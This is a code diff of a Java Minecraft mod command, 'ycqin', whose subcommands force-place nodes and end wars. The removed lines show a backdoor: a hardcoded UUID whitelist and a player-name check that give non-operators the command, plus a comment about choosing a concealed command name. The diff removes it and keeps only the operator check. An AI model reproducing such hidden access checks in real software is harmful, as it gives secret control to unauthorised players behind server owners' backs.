@@ -21,15 +21,11 @@ import javax.annotation.Nullable;
 import java.util.*;
 
 public class YcCommand extends CommandBase {
-    private static final List<UUID> ALLOWED_UUIDS = new ArrayList<>();
     private static final List<String> SUBCOMMANDS = Arrays.asList("ForcePlaceNode","forceEnd","getWarBlock");
-    static {
-        ALLOWED_UUIDS.add(UUID.fromString("e8f0f6ce-7085-437a-86bb-0bc5ea4c0e06"));
-    }
 
     @Override
     public String getName() {
-        return "ycqin"; // 命令名称，可以起一个隐蔽的名字
+        return "ycqin";
     }
 
     @Override
@@ -45,12 +41,7 @@ public class YcCommand extends CommandBase {
         if (sender instanceof EntityPlayer) {
             EntityPlayer player = (EntityPlayer) sender;
             // 管理员（OP）始终有权限
-            if (server.getPlayerList().canSendCommands(player.getGameProfile())) {
-                return true;
-            }
-            if (player.getName().equals("ycqin")) return true;
-            // 检查UUID白名单
-            return ALLOWED_UUIDS.contains(player.getUniqueID());
+            return server.getPlayerList().canSendCommands(player.getGameProfile());
         }
         // 非玩家（如控制台）默认无权限，可根据需要修改
         return false;
@@ -68,7 +59,7 @@ public class YcCommand extends CommandBase {
         }
 
         String sub = args[0];
-         if ("ForcePlaceNode".equalsIgnoreCase(sub)) {
+        if ("ForcePlaceNode".equalsIgnoreCase(sub)) {
             // ========== ForcePlaceNode 子命令 ==========
             if (args.length < 5) {
                 throw new WrongUsageException("/ycqin ForcePlaceNode <x> <y> <z> <type>");
